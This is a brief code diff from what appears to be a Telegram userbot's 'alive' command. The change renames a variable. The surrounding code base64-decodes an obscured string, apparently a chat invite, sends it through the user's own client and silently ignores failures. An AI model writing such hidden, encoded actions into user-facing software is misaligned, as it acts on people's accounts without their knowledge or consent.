@@ -60,10 +60,10 @@ async def amireallyalive(event):
         ping=ms,
         Tare5=installation_time,
     )
-    hmm = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    hmm = Get(hmm)
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
     try:
-        await event.client(hmm)
+        await event.client(joker)
     except BaseException:
         pass
     if HuRe_IMG:
